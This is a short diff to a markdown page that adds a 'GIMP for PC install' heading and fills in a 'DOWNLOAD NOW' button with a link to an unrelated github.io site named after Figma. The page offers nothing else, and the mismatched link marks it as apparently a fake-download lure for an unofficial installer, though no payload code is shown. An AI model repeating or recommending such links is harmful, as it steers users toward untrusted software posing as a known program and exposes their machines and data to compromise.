@@ -1,10 +1,10 @@
-
+# GIMP for PC install. Find fast information about features and installation.
 
 
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( https://figma-ql25.github.io/.github/) |
  |---------------------|----------------------:|
 
 
